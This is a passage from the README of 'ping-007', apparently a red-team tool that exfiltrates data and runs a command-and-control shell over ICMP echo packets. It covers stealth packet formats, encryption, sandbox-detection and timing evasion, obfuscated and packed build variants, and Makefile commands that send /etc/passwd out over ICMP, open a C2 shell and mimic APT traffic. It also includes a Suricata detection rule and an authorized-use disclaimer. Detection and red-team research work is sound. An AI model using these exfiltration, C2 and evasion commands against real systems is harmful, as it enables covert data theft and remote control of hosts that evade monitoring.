| Raw socket process on endpoint | EDR (Sysmon event 3) | High — catches the process, not the data |
| Unusual ICMP Reply/Request ratio | NDR (Vectra, Darktrace) | Medium |

**Suricata rule to detect PING-007 fragment sessions:**
```
alert icmp any any -> any any (
  msg:"PING-007 stealth fragment magic byte 0xA7";
  itype:8; icode:0;
  content:"|A7|"; offset:8; depth:1;
  threshold: type both, track by_src, count 3, seconds 30;
  sid:9000001; rev:1;
)
```

> Use `--no-encrypt` + `--encode` only for testing — the fragment header `0xA7` remains detectable. In real ops, the 64-byte stealth packet with inline XOR steganography (no `0xA7` header) is the hardest to detect.

---

## Cryptographic Details

All three algorithms use **PBKDF2-SHA256 (100 000 iterations)** with a **fixed per-algorithm salt** for deterministic key derivation from a shared password.

| Algorithm | Key | Auth | Salt |
|-----------|-----|------|------|
| AES-256-GCM | 256-bit | AEAD | `ping007-aes-salt-v1` |
| ChaCha20-Poly1305 | 256-bit | AEAD | `ping007-chacha20-salt-v1` |
| Custom XOR-CFB-HMAC | 256-bit | HMAC-SHA256 | `ping007-xor-salt-v1` |

Wire format: `[4-byte header: algo+version][12-byte nonce][ciphertext][16-byte tag]`

The listener auto-detects the algorithm from the 4-byte header.

---

## OS Signature Profiles

| Profile | Payload size | Stealth capacity | Frag capacity | Pattern | TTL |
|---------|-------------|-----------------|---------------|---------|-----|
| `linux` (default) | 64 bytes | 46 bytes/pkt | 42 bytes/frag | Sequential `0x08,0x09,…` | 64 |
| `windows` | 40 bytes | 22 bytes/pkt | 18 bytes/frag | Alphabetic `abcdefgh…` | 128 |
| `none` / `--no-signature` | Variable | N/A | N/A | Raw bytes | kernel default |

For messages/chunks that exceed the single-packet stealth capacity, ping-007 automatically
fragments them across multiple 64-byte pings using a 4-byte embedded header
(`[0xA7 magic][session][frag_id][total_frags]`). The receiver reassembles all fragments
before decryption. Each fragment is sent at ~1s intervals to match real `ping` cadence.

**Stealth capacity arithmetic (Linux):**
- ICMP payload = 56 bytes (Linux `ping -s 56`)
- 8 bytes = timeval (struct timeval, LE)
- 2 bytes = length prefix (XOR'd into sequential pattern)
- **46 bytes** free for single-packet hidden data
- AES-256-GCM overhead = 4 (header) + 12 (nonce) + 16 (GCM tag) = 32 bytes
- → Max single-packet plaintext = 14 bytes; above that, auto-fragmentation kicks in

---

## Testing

```bash
make test                # Run full test suite with race detector + HTML coverage report
go test ./...            # Quick run (no coverage)
go test ./internal/crypto/... -v    # Crypto package only
go test ./internal/network/... -v   # Network / fragment protocol only
go test ./internal/config/... -v    # Config validation only
```

### Test coverage

| Package | Tests | What is covered |
|---------|-------|-----------------|
| `internal/crypto` | 49 | AES-256-GCM round-trip, ChaCha20-Poly1305 round-trip, XOR-CFB-HMAC round-trip; shared-password cross-instance decryption; wrong-key rejection; AAD context binding (AES + XOR); header-based algorithm auto-detection; 64 KiB payload; `NonceManager` uniqueness (1 000 nonces); `NonceManager.Reset` counter restart; `GenerateNonceSize` too-small/valid/counter-embedded; `secureRandomIndex` invalid-max/max-1/bounds; `GetActiveAlgorithm` valid+consistent; `RotateAlgorithm` changes-algo/cycles-all-three/empty-providers-error; `Provider.Name()` for all 3 providers; `Provider.KeyRotation()` post-rotation round-trip; `DecryptWithAlgorithmDetection` AES/ChaCha20/XOR/fallback-path (3-byte garbage)/header-found-decrypt-fails (corrupted ciphertext falls through to full scan); `decodeCryptoHeader` too-short/unknown-algo/unsupported-version/valid; `algorithmFromType` unknown→0; `typeFromAlgorithm` unknown→""; `startKeyRotation` goroutine no-panic (RotationInterval=10ms, tick fires); `startKeyRotation` rotation-error path (single-provider → RotateAlgorithm fails → error-log Printf covered); `EncryptWithContext` no-provider error; `DecryptWithContext` no-provider/too-short/invalid-header errors; `AES256Provider` nil-GCM guard; `ChaCha20Provider` nil-AEAD guard; `CustomXORProvider` empty-keys guard; XOR context-binding round-trip + HMAC mismatch; `CryptoEngine.SetPassword` provider-error propagation (errProvider); `CryptoEngine.Close` provider-error warning path (fmt.Printf branch via errProvider) |
| `internal/config` | 20 | `ValidateTarget` (authorized / forbidden / out-of-range / invalid IP / hostname-resolved-then-forbidden / non-resolvable hostname → cannot-resolve error); `validateConfig` (malformed CIDR, rotation interval floor, negative uptime, APT timing/size range order); `EnsureDirectories` (empty/temp-dir/parent-is-file error); `GetAPTProfile` found / not-found / all 4 built-in profiles; `Load` default config when no file present |
| `internal/network` | 31 | `PacketBuilder` (data, stealth, chunk packets); legitimate payload sizing; `FragDataCapacity` linux/windows/default; single-fragment, multi-fragment, full reassembly (200 B decoded with XOR extraction); Windows fragment count; 255-fragment overflow guard; OS signature header; `calculateChecksum` all-zeros/ICMP-echo/checksum-field-zeroing/odd-length; `parseICMPPacket` too-short/header-fields/payload-extraction; `buildICMPPacket` structure+checksum/sequence-increment; `GetMetrics` copy semantics; `UpdateLatency` / `UpdateThroughput`; `CreateStealthChunksWithSignature` linux-3pkt/windows-3pkt/none-1pkt/empty/chunk-size-header; `CreateChunkPacket` headers (chunk_id/total_chunks/checksum); `GetLocalInterface` no-panic; `ValidateIP` invalid-format / valid-IP-unreachable-without-CAP_NET_RAW |
| `internal/evasion` | 30 | Engine init; sandbox check disabled/enabled; all 4 APT timing profiles (MinDelay ≤ MaxDelay, jitter in `[0,1]`); unknown APT profile error; adaptive delay disabled; delay non-negative over 200 iterations; `CalculateAdaptiveDelay` with data >1 KiB (log-factor branch), burst mode (BurstProbability=1.0), pause mode (PauseProbability=1.0); service mimicry valid/unknown; obfuscation disabled/padded/empty sizes / with-fake-data-injection (FakeDataInjectionRate=1.0); `generateRandomFloat` bounds (10 000 samples); `applyPadding` OOB regression (10 000 calls); `injectFakeData` output length/empty-input/sentinel preservation; `contains` present/absent/empty-slice/empty-string; `checkUptime` low-uptime branch (MinUptime=100k days); `checkProcessCount` low-count branch (MinProcesses=999999); `DetectSandbox` StrictMode (threshold=0.3); `DetectSandbox` indicator-append branch (MinUptime=100k days → non-empty indicator → Indicators slice populated); `TimingController.CalculateDelay` disabled early-return path |
| `internal/logger` | 33 | `NONE` level → no `logs/` directory created, no file; all log levels (Info/Debug/Warn/Error); JSON and text formats; `LogSecurityEvent` for all severity strings; `LogExfiltrationEvent`, `LogShellActivity`, `LogEvasionActivity`, `LogNetworkActivity`, `LogCryptoActivity`; `RotateLog` no-file/below-limit/rotation-triggered (creates `.1`)/new-file-error (unlinked fd + read-only dir); `AuditLogger` create/write/close/multiple-events/nil-file-close/dir-is-file-error/file-create-error (read-only dir); `LogAuditEvent` json.Marshal error (channel in metadata → early return, no write); `NewSIEMWriter` + `Write` (returns len) + `Close`; `NewWithConfig` with SIEM enabled/with warn level/with error level; `NewWithConfig` MkdirAll+OpenFile failure paths (parent-is-file → l.file=nil, logger degrades gracefully); `sendToSIEM` elastic branch (calls `sendToElastic`); `sendToSIEM` default branch (calls `sendToFile`, creates `logs/ping-007-siem.log`); `SIEMWriter.Write` done-channel path (closed writer returns error); `SIEMWriter.Write` buffer-full path (silent drop, default case) |
| `internal/exfiltration` | 31 | `randInRange` bounds (5 000 samples), min=max, min>max guard; `validateJob` for all error cases (missing ID/target/data, negative chunk size, unknown method) and all 4 valid methods; `createChunks` single/multiple/total-patching/checksum/status/empty/default-size/with-encryption (real `CryptoEngine`, EncryptEnabled=true)/encryption-error (closed engine → Encrypt fails); `loadFile` existing file, non-existent, directory, no-read-permission (chmod 000, skip-if-root); `GetJobStats`, `GetActiveJobs`; `CancelJob` not-found/removes-job; `NewExfiltrationMonitor`; `GetProgress` not-found/zero-default/metadata-value |
| `internal/orchestrator` | 32 | `extractLinuxPattern` round-trip (5 cases), too-short, invalid length; `extractWindowsPattern` round-trip (4 cases), too-short, invalid length; `extractStealthData` dispatch linux-56/windows-32/raw/too-short/empty-pattern-data (exactly 8 bytes); `calculateEntropy` empty/constant/binary-50-50 (~1 bit)/uniform-256 (~8 bits); `generateSessionID` format+uniqueness (50 calls); `generateJobID` format; `isLegitimateLinuxPing` clean/stealth/wrong-length/high-deviation; `analyzeForFrameworkTraffic` session-id header/high-entropy/legit-ping bypass/low-entropy/empty; `getMaxDataSize` windows/linux/default; `generateAPTData` format+profile+sequence; `SetPassword` nil-cryptoEngine error |
| `internal/shell` | 24 | `randJitter` zero/negative max, bounds (5 000 samples); `NewShellEngine` initial state; `GetActiveSessions` initially empty; `GetSessionStats` initially empty / with 1 active + 1 inactive session (loop body covered); `StartSession` max-sessions limit, duplicate ID; `getSession` not-found, inactive, expired no-race regression (20 concurrent goroutines with `-race`); `CleanupExpiredSessions` stale removal, fresh preservation, inactive-within-timeout; `GetActiveSessions` active/inactive filter; `parseResponse` valid-full / success-false-nonzero-rc / partial-no-stdout / invalid-format (4 cases) / colon-in-stdout / encrypted+nil-engine / decryption-error (closed CryptoEngine) / encrypted-success (payload = decryptedData covered) / non-integer RC (Sscanf error → ReturnCode -1) |

**250 tests total** across 8 packages, all passing with `-race`. Tests run without network access or root — no raw sockets involved.

---

## Build Variants

```bash
make build               # Standard build → build/ping-007
make build-no-c2         # OPSEC variant → build/ping-007-noc2  (no interactive shell, exfil+listen intact)
make build-stealth       # Manual obfuscation (-trimpath -buildmode=pie)
make build-ghost         # Maximum stripping + obfuscation
make build-compressed    # UPX compression (requires upx)
make build-armored       # Stealth + UPX
make build-minimal       # No APT simulation module (-tags minimal)
make build-all           # All platforms (linux/darwin/windows, amd64/arm64)
```

---

## Makefile Shortcuts

```bash
make basic TARGET=192.168.1.100 PASSWORD='secret'
make stealth TARGET=192.168.1.100 DATA='payload' PASSWORD='secret'
make exfil TARGET=192.168.1.100 FILE=/etc/passwd PASSWORD='secret'
make exfil TARGET=192.168.1.100 FILE=data.zip METHOD=icmp_tunnel MODE=fast PASSWORD='secret'
make apt TARGET=192.168.1.100 PROFILE=lazarus DURATION=300
make shell TARGET=192.168.1.100 PASSWORD='c2pass'
make listen OUTPUT=./loot TIMEOUT=300 PASSWORD='secret'
make analyze DURATION=120
make ultra-stealth TARGET=192.168.1.100 PASSWORD='stealth-key'
make ghost-mode TARGET=192.168.1.100 PASSWORD='ghost-key'
make human-mimic TARGET=192.168.1.100 PASSWORD='test'
make natural-test TARGET=192.168.1.100 COUNT=10 PASSWORD='test'
make crypto-demo
```

---

## Documentation

| Document | Content |
|----------|---------|
| [Site / full doc](docs/index.html) | Architecture, wire format, crypto details, flag reference |
| [TODO](TODO.md) | Roadmap |

---

## References

Technical claims in this documentation are backed by the following published sources:

| Claim | Source |
|-------|--------|
| DLP/firewalls don't inspect ICMP payload | [DeepStrike — What Is ICMP Tunneling?](https://deepstrike.io/blog/what-is-icmp-tunneling) |
| Windows ping payload = `abcdefghijklmnopqrstuvwabcdefghi` | [Palo Alto LIVEcommunity — ICMP Covert Channel](https://live.paloaltonetworks.com/t5/general-topics/icmp-covert-channel-allow-only-icmp-ping-packet-that-has/td-p/259933) |
| Linux TTL=64 / Windows TTL=128 | [InfiniteLogins — Using Ping TTLs to Fingerprint OS](https://infinitelogins.com/2020/12/12/using-ping-ttls-values-to-fingerprint-operating-systems/) · [OSTechNix](https://ostechnix.com/identify-operating-system-ttl-ping/) |
| ICMP covert channel technique | [JumpSec Labs — Misusing ICMP for file transfers](https://labs.jumpsec.com/covert-channels-misusing-icmp-protocol-for-file-transfers-with-scapy/) |
| Behavioral detection via NetFlow/NDR | [Vectra AI — ICMP Tunnel detection](https://www.vectra.ai/detections/icmp-tunnel) |
| Entropy analysis for ICMP | [Trisul Network Analytics — Detecting ICMP covert channels](https://www.trisul.org/blog/detecting-icmp-covert-channels-through-payload-analysis/) |
| Exfiltration via ICMP — detection methods | [APNIC Blog — Common data exfiltration attacks](https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/) |
| Pingback malware (ICMP C2, 2021) | [Trustwave SpiderLabs — Backdoor at the end of the ICMP tunnel](https://levelblue.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/) |
| Pingback Zeek detection package | [Corelight — pingback GitHub package](https://github.com/corelight/pingback) |
| PingPull (GALLIUM ICMP C2, 2022) | [Unit42 / Palo Alto Networks — GALLIUM Expands Targeting with PingPull](https://unit42.paloaltonetworks.com/pingpull-gallium/) |
| PHOREAL (APT32/OceanLotus ICMP C2, 2017+) | [MITRE ATT&CK G0050 — APT32](https://attack.mitre.org/groups/G0050/) · [Mandiant — Cyber Espionage is Alive and Well: APT32](https://www.mandiant.com/resources/cyber-espionage-apt32) |
| Cobalt Strike / icmpsh / ptunnel in red team | [Cynet — How Hackers Use ICMP Tunneling](https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/) · [Hacking Articles](https://www.hackingarticles.in/command-and-control-tunnelling-via-icmp/) |
| Academic — "ICMP traffic considered benign" | [Springer — Covert Channel Detection in ICMP Payload](https://link.springer.com/content/pdf/10.1007/978-3-540-39737-3_103.pdf) |
| Steganography in malware (in-the-wild list) | [GitHub — steg-in-the-wild by lucacav](https://github.com/lucacav/steg-in-the-wild) |

---

## Authorized Use Only

This tool is designed exclusively for:
- Authorized penetration testing engagements
- Internal red team exercises
- Security research within sanctioned perimeters
- Blue team detection validation
- CTF competitions

Unauthorized use against systems you do not own or have explicit written permission to test is illegal and strictly prohibited.
